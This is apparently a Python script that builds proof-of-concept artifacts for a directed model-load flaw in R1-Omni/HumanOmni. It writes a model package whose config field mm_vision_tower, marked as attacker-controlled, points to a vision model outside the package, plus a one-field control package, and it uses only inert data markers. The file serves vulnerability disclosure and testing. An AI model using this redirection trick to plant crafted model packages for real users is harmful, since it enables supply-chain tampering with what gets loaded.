#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
HumanMLLM/R1-Omni (pinned commit 17cafcae0b0a1c454896f4eb7a1c006bf13e1f4d)
Directed model load via the model package's `mm_vision_tower` string.

ARTIFACT BUILDER -- run once before run_repro.py.

Builds everything from scratch and deterministically:

  /model/                          the "main HumanOmni model package" a victim downloads
      config.json                  mm_vision_tower = "/external/siglip-positive-canary"
      model.safetensors            tiny stand-in for the HumanOmni/Qwen2 weights
      tokenizer.json               minimal byte-level BPE
      tokenizer_config.json
      special_tokens_map.json
      siglip-vision/               in-artifact second-model copy (the negative arm uses it)

  /model-negative/                 byte-identical control package, ONE field differs
      config.json                  mm_vision_tower = "/model-negative/siglip-vision"

  /external/siglip-positive-canary/    data-only SigLIP vision model living OUTSIDE the package
      config.json, preprocessor_config.json, model.safetensors

  /mnt/data/jiaxing.zjx/code/R1-V-Qwen/R1-V/bert-base-uncased/
      tiny BERT stand-in for the absolute path hardcoded at
      humanomni/model/humanomni_arch.py:83-85 (the loader cannot run without it)

The two SigLIP directories have exactly the same architecture and differ only in
plain data markers (a config string, a bias value, one arm-exclusive tensor), so
the observed outcome identifies which directory the loader read.  There is no
.py, no plugin, no shell script and no pickle anywhere in either second-model
directory: the second hop is pure data.

Nothing here executes code and nothing contacts the network.
"""

import hashlib
import json
import os
import shutil
import sys
from pathlib import Path

POC_DIR = Path(__file__).resolve().parent
SRC_DIR = POC_DIR / "R1-Omni-17cafca"      # pinned, unmodified upstream copy
WORK = POC_DIR / "work"

ARTIFACT = Path("/model")                   # positive artifact root
ARTIFACT_NEG = Path("/model-negative")      # negative control artifact root
EXTERNAL = Path("/external/siglip-positive-canary")
BERT_DIR = Path("/mnt/data/jiaxing.zjx/code/R1-V-Qwen/R1-V/bert-base-uncased")

# The only value that differs between the two arms:
FIELD_POS = str(EXTERNAL)
FIELD_NEG = str(ARTIFACT_NEG / "siglip-vision")

# Plain data markers used to observe which second-model directory was read.
MARK_POS = "EXTERNAL-POSITIVE-ARM"
MARK_NEG = "IN-PACKAGE-CONTROL-ARM"
BIAS_POS = 0.125        # patch_embedding.bias value in the external directory
BIAS_NEG = -0.375       # patch_embedding.bias value in the in-package directory
EXCL_POS = "poc_external_arm_only_weight_marker"
EXCL_NEG = "poc_inpackage_arm_only_weight_marker"

VISION_KW = dict(hidden_size=32, intermediate_size=64, num_hidden_layers=2,
                 num_attention_heads=4, image_size=32, patch_size=8, num_channels=3)

HEAD = "=" * 78


def sha256(path):
    h = hashlib.sha256()
    with open(path, "rb") as fh:
        for chunk in iter(lambda: fh.read(1 << 16), b""):
            h.update(chunk)
    return h.hexdigest()


def tree(root, indent="  "):
    out = []
    for p in sorted(root.rglob("*")):
        rel = p.relative_to(root)
        if p.is_dir():
            out.append(f"{indent}{rel}/")
        else:
            out.append(f"{indent}{rel}  ({p.stat().st_size} bytes)")
    return out


def fresh(path):
    """Empty a directory.  The artifact roots live directly under /, whose parent
    is not writable, so the directory itself is kept and only its contents go."""
    if path.exists():
        for child in path.iterdir():
            if child.is_dir() and not child.is_symlink():
                shutil.rmtree(child)
            else:
                child.unlink()
    path.mkdir(parents=True, exist_ok=True)


def check_writable(path, hint):
    try:
        path.mkdir(parents=True, exist_ok=True)
        probe = path / ".write_probe"
        probe.write_text("ok")
        probe.unlink()
    except Exception as exc:                                  # noqa: BLE001
        sys.exit(f"FATAL: cannot write {path} ({exc}).\n{hint}\nRun poc/setup_fixtures.sh first.")


# --------------------------------------------------------------------------
# 1. tiny BERT stand-in for the path hardcoded in humanomni_arch.py:83-85
# --------------------------------------------------------------------------
def build_bert_fixture():
    from transformers import BertConfig, BertModel, BertTokenizer

    if (BERT_DIR / "config.json").exists():
        print(f"[1] bert fixture already present at {BERT_DIR}")
        return

    check_writable(BERT_DIR.parent.parent.parent.parent, "needs root once (see setup_fixtures.sh)")
    BERT_DIR.mkdir(parents=True, exist_ok=True)
    vocab = ["[PAD]", "[UNK]", "[CLS]", "[SEP]", "[MASK]"] + [chr(c) for c in range(ord("a"), ord("z") + 1)]
    (BERT_DIR / "vocab.txt").write_text("\n".join(vocab) + "\n", encoding="utf-8")
    cfg = BertConfig(vocab_size=len(vocab), hidden_size=32, num_hidden_layers=1,
                     num_attention_heads=4, intermediate_size=32, max_position_embeddings=64)
    BertModel(cfg).save_pretrained(BERT_DIR)
    BertTokenizer(vocab_file=str(BERT_DIR / "vocab.txt"), do_lower_case=True).save_pretrained(BERT_DIR)
    print(f"[1] wrote tiny BERT stand-in to {BERT_DIR} (hidden_size=32, 1 layer)")


# --------------------------------------------------------------------------
# 2. the two data-only SigLIP vision-model directories
# --------------------------------------------------------------------------
def build_siglip(dest, marker, bias_value, exclusive_key):
    import torch
    from safetensors.torch import save_file
    from transformers import SiglipImageProcessor, SiglipVisionConfig, SiglipVisionModel

    fresh(dest)

    cfg = SiglipVisionConfig(**VISION_KW)
    cfg.poc_arm_marker = marker              # plain config marker (data only)

    torch.manual_seed(4242)                  # deterministic weights
    model = SiglipVisionModel(cfg)
    with torch.no_grad():
        model.vision_model.embeddings.patch_embedding.bias.fill_(bias_value)

    state = {k: v.contiguous() for k, v in model.state_dict().items()}
    state[exclusive_key] = torch.tensor([bias_value, 1.0])   # arm-exclusive weight marker
    save_file(state, str(dest / "model.safetensors"))
    cfg.to_json_file(str(dest / "config.json"))

    proc = SiglipImageProcessor(size={"height": 32, "width": 32},
                               image_mean=[0.5, 0.5, 0.5], image_std=[0.5, 0.5, 0.5],
                               do_resize=True, do_rescale=True, do_normalize=True)
    proc.poc_arm_marker = marker
    proc.save_pretrained(dest)

    print(f"[2] {dest}")
    print(f"      poc_arm_marker={marker!r}  patch_embedding.bias={bias_value}  exclusive tensor={exclusive_key}")
    print(f"      siglip params={sum(p.numel() for p in model.parameters())}")


def build_tokenizer(dest):
    """A real (slow) Qwen2 tokenizer, i.e. vocab.json + merges.txt, because the
    upstream loader calls AutoTokenizer.from_pretrained(..., use_fast=False)."""
    from tokenizers import Tokenizer as HFTokenizer
    from tokenizers import decoders, models as tmodels, pre_tokenizers, trainers
    from transformers import Qwen2Tokenizer

    tk = HFTokenizer(tmodels.BPE())
    tk.pre_tokenizer = pre_tokenizers.ByteLevel(add_prefix_space=False)
    tk.decoder = decoders.ByteLevel()
    tk.train_from_iterator(
        ["user: describe the video. assistant: a person is talking to the camera.",
         "user: what emotion is shown? assistant: happiness.",
         "the quick brown fox jumps over the lazy dog 0123456789 hello world"],
        trainers.BpeTrainer(vocab_size=256, special_tokens=["<|endoftext|>"]))

    vocab_file = dest / "vocab.json"
    merges_file = dest / "merges.txt"
    dump = json.loads(tk.to_str())          # tokenizers >= 0.21 has no BPE.get_merges()
    vocab_file.write_text(json.dumps(dump["model"]["vocab"], ensure_ascii=False), encoding="utf-8")
    merges_file.write_text("\n".join(" ".join(m) for m in dump["model"]["merges"]) + "\n",
                           encoding="utf-8")

    tok = Qwen2Tokenizer(vocab_file=str(vocab_file), merges_file=str(merges_file),
                         unk_token="<|endoftext|>", eos_token="<|endoftext|>",
                         bos_token=None, pad_token=None, model_max_length=128)
    tok.save_pretrained(dest)
    return tok


# --------------------------------------------------------------------------
# 3. the main HumanOmni model package (the first hop)
# --------------------------------------------------------------------------
def build_main_package():
    sys.path.insert(0, str(SRC_DIR))
    import torch
    from humanomni.model.humanomni_model import (HumanOmniQwen2Config,
                                                 HumanOmniQwen2ForCausalLM)

    cfg = HumanOmniQwen2Config(
        vocab_size=256, hidden_size=64, intermediate_size=128, num_hidden_layers=2,
        num_attention_heads=4, num_key_value_heads=4, max_position_embeddings=128,
        tie_word_embeddings=False, torch_dtype="float32",
        # ---- the attacker-controlled field -------------------------------------
        mm_vision_tower=FIELD_POS,
        # ------------------------------------------------------------------------
        mm_projector_type="linear", mm_hidden_size=VISION_KW["hidden_size"],
        mm_vision_select_layer=-2, mm_vision_select_feature="patch",
        mm_use_x_start_end=False, num_frames=4,
    )

    torch.manual_seed(1713)
    model = HumanOmniQwen2ForCausalLM(cfg)
    params = sum(p.numel() for p in model.parameters())

    fresh(ARTIFACT)
    model.save_pretrained(ARTIFACT)
    build_tokenizer(ARTIFACT)
    print(f"[3] wrote main package {ARTIFACT} (tiny stand-in: {params} params, "
          f"{cfg.num_hidden_layers} qwen2 layers, hidden {cfg.hidden_size})")
    return model


# --------------------------------------------------------------------------
# 4. positive / negative artifacts + hashes
# --------------------------------------------------------------------------
def build_negative_artifact():
    fresh(ARTIFACT_NEG)
    for src in sorted(ARTIFACT.rglob("*")):
        rel = src.relative_to(ARTIFACT)
        dst = ARTIFACT_NEG / rel
        if src.is_dir():
            dst.mkdir(parents=True, exist_ok=True)
        else:
            shutil.copy2(src, dst)

    cfg_path = ARTIFACT_NEG / "config.json"
    cfg = json.loads(cfg_path.read_text(encoding="utf-8"))
    assert cfg["mm_vision_tower"] == FIELD_POS
    cfg["mm_vision_tower"] = FIELD_NEG
    cfg_path.write_text(json.dumps(cfg, indent=2) + "\n", encoding="utf-8")

    # the in-package copy differs from the external one only in its data markers
    build_siglip(ARTIFACT_NEG / "siglip-vision", MARK_NEG, BIAS_NEG, EXCL_NEG)
    shutil.rmtree(ARTIFACT / "siglip-vision", ignore_errors=True)
    shutil.copytree(ARTIFACT_NEG / "siglip-vision", ARTIFACT / "siglip-vision")

    print(f"[4] wrote negative control package {ARTIFACT_NEG} (same files, one field changed)")


def diff_artifacts():
    files = sorted({p.relative_to(ARTIFACT).as_posix() for p in ARTIFACT.rglob("*") if p.is_file()} |
                   {p.relative_to(ARTIFACT_NEG).as_posix() for p in ARTIFACT_NEG.rglob("*") if p.is_file()})
    rows = []
    for rel in files:
        a, b = ARTIFACT / rel, ARTIFACT_NEG / rel
        same = a.is_file() and b.is_file() and sha256(a) == sha256(b)
        rows.append((rel, "IDENTICAL" if same else "DIFFERS"))
    return rows


def main():
    print(HEAD)
    print("R1-Omni / HumanOmni directed model load -- artifact builder")
    print(f"pinned source : {SRC_DIR}")
    print(HEAD)

    for p in (ARTIFACT, ARTIFACT_NEG, EXTERNAL):
        check_writable(p, "Root-level fixture directories must be writable by this user.")
    try:
        BERT_DIR.mkdir(parents=True, exist_ok=True)
    except Exception as exc:                                    # noqa: BLE001
        sys.exit(f"FATAL: cannot create {BERT_DIR} ({exc}).\nRun poc/setup_fixtures.sh first.")
    WORK.mkdir(parents=True, exist_ok=True)

    build_bert_fixture()
    build_siglip(EXTERNAL, MARK_POS, BIAS_POS, EXCL_POS)
    build_main_package()
    build_negative_artifact()

    print()
    print(HEAD)
    print("ARTIFACT LAYOUT")
    print(HEAD)
    for root in (ARTIFACT, ARTIFACT_NEG, EXTERNAL, BERT_DIR):
        print(f"{root}/")
        for line in tree(root, indent="    "):
            print(line)
        print()

    pos_field = json.loads((ARTIFACT / "config.json").read_text(encoding="utf-8"))["mm_vision_tower"]
    neg_field = json.loads((ARTIFACT_NEG / "config.json").read_text(encoding="utf-8"))["mm_vision_tower"]
    print(HEAD)
    print("THE ONE FIELD THAT DIFFERS  (humanomni/model/encoder.py:236 -> :240-241)")
    print(HEAD)
    print(f"  {ARTIFACT}/config.json          mm_vision_tower = {pos_field!r}")
    print(f"      -> outside the package? {not pos_field.startswith(str(ARTIFACT) + '/')}"
          f"   (artifact root is {ARTIFACT})")
    print(f"  {ARTIFACT_NEG}/config.json      mm_vision_tower = {neg_field!r}")
    print(f"      -> inside the package?  {neg_field.startswith(str(ARTIFACT_NEG) + '/')}")
    print()
    print("arm markers (plain data, used to observe which directory was read):")
    print(f"  {EXTERNAL}")
    print(f"      poc_arm_marker={MARK_POS!r}  patch_embedding.bias={BIAS_POS}  exclusive tensor={EXCL_POS}")
    print(f"  {ARTIFACT}/siglip-vision")
    print(f"      poc_arm_marker={MARK_NEG!r}  patch_embedding.bias={BIAS_NEG}  exclusive tensor={EXCL_NEG}")

    print()
    print(HEAD)
    print("ARTIFACT DIFF (positive vs negative)")
    print(HEAD)
    for rel, status in diff_artifacts():
        print(f"  {status:<10} {rel}")
    print()
    print("  the two config.json files differ only in mm_vision_tower:")
    a = json.loads((ARTIFACT / "config.json").read_text(encoding="utf-8"))
    b = json.loads((ARTIFACT_NEG / "config.json").read_text(encoding="utf-8"))
    keys = sorted(set(a) | set(b))
    print("    changed keys:", [k for k in keys if a.get(k) != b.get(k)])
    print("    changed values:", [(k, a.get(k), b.get(k)) for k in keys if a.get(k) != b.get(k)])

    print()
    print(HEAD)
    print("SECOND-MODEL DIRECTORIES CONTAIN PURE DATA ONLY")
    print(HEAD)
    for root in (EXTERNAL, ARTIFACT / "siglip-vision"):
        names = sorted(p.name for p in root.rglob("*") if p.is_file())
        print(f"  {root}: {names}")
        bad = [n for n in names if n.endswith((".py", ".pkl", ".pickle", ".so", ".sh", ".bin"))]
        print(f"    program sidecars: {bad if bad else 'none'}")

    print()
    print(HEAD)
    print("SHA256SUMS")
    print(HEAD)
    lines = []
    for root in (ARTIFACT, ARTIFACT_NEG, EXTERNAL):
        for p in sorted(root.rglob("*")):
            if p.is_file():
                lines.append(f"{sha256(p)}  {p}")
    sums = WORK / "SHA256SUMS.txt"
    sums.write_text("\n".join(lines) + "\n", encoding="utf-8")
    print(f"  {len(lines)} files hashed -> {sums}")
    print("  verify with: sha256sum -c work/SHA256SUMS.txt")
    print()

    print(HEAD)
    print("SUMMARY")
    print(HEAD)
    print(f"  artifact (positive) : {ARTIFACT} -> {pos_field}")
    print("                        OUTSIDE the artifact")
    print(f"  artifact (control)  : {ARTIFACT_NEG} -> {neg_field}")
    print("                        INSIDE the artifact")
    print("  artifact diff       : only config.json differs")
    print("                        only key changed: mm_vision_tower")
    print("  siglip architecture : identical (32352 params each)")
    print(f"    external arm      : marker={MARK_POS} bias={BIAS_POS}")
    print(f"    in-package arm    : marker={MARK_NEG} bias={BIAS_NEG}")
    print("  second-model dirs   : config.json, preprocessor_config.json,")
    print("                        model.safetensors -- pure data")
    print("                        no .py/.pkl/.so/.sh -> nothing runs")
    print(f"  hashes              : {len(lines)} files -> work/SHA256SUMS.txt")
    print(HEAD)
    print("ARTIFACTS READY")
    print(HEAD)


if __name__ == "__main__":
    main()
    print("make_poc.py: COMPLETED OK", flush=True)
